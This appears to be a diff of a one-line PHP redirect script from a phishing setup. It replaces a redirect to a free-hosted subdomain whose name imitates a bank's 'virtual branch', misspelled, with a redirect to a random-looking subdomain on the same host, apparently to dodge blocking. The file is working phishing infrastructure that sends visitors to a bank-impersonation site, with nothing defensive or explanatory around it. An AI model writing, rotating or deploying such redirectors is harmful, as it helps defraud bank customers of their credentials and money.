@@ -1,4 +1,4 @@
 <?php
-	header("location: http://sucursalbancolombivirtul0721.liveblog365.com/");
+	header("location: http://3dfwef3ngjyuk-yrv-ygh33fg-33.liveblog365.com/");
 ?>
 
